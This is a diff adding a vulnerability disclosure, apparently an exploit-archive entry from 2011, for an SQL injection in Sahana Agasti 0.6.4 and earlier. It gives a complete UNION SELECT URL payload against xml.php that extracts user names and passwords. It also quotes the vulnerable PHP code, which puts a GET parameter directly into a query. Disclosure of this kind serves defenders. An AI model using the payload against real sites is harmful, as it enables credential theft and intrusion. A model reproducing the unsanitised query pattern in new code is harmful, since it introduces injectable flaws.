@@ -1,0 +1,64 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+   [ Discovered by dun \ posdub[at]gmail.com ]
+
+ ################################################################
+ #  [ Sahana Agasti <= 0.6.4 ]  SQL Injection Vulnerability     #
+ ################################################################
+ #
+ # Script: "Agasti is the PHP based project of the Sahana Software Foundation. 
+ #          Based a long-term preparedness for disaster management..."
+ #
+ # Script site: http://www.sahanafoundation.org/
+ # Download: https://launchpad.net/sahana-agasti/
+ #
+ # [SQL] Vuln: 
+ # http://site.com/agasti/sahana-0.6.4/www/xml.php?act=add_loc&sel=1/**/UNION/**/SELECT/**/null,concat(CHAR(60,66,82,62),concat_ws(char(58),user_name,password)),null/**/FROM/**/users
+ #    
+ #    
+ # Bug: ./sahana-0.6.4/www/xml.php (lines: 17-21, 200-223)
+ #
+ # ...
+ # $act=$_GET{"act"};                                                          //
+ # 
+ # if($act=='add_loc')                                                         // (1)
+ # {
+ #         _shn_get_level_location();                                          //
+ # ...
+ # 
+ # function _shn_get_level_location(){
+ #         require_once('../3rd/adodb/adodb.inc.php');
+ #         require_once('../conf/sysconf.inc.php');
+ #         //Make the connection to $global['db']
+ #         $db = NewADOConnection($conf['db_engine']);
+ #        $db ->Connect($conf['db_host'].($conf['db_port']?':'.$conf['db_port']:''),$conf['db_user'],$conf['db_pass'],$conf['db_name']);
+ # 
+ # 
+ #         $level=$_GET{"sel"};                                                // (2)
+ #         if($level==1){
+ #                 echo "none,";
+ #         }
+ #         $q = "SELECT location.name,location.loc_uuid,parent_id FROM location WHERE location.opt_location_type={$level}";          // (3) SQL
+ #         $res_child=$db->Execute($q);
+ #         if($res_child->EOF)
+ #         return;
+ #         while(!$res_child->EOF){
+ #                 $res=$res.",".$res_child->fields[1];
+ #                 $res=$res.",".$res_child->fields[0];
+ #                $res_child->MoveNext();
+ #        }
+ #         echo $res;                                                          // (4)
+ # }
+ # ...  
+ # 
+ # 
+ ###############################################
+
+ 
+ [ dun / 2011-01-01 ]
+ 
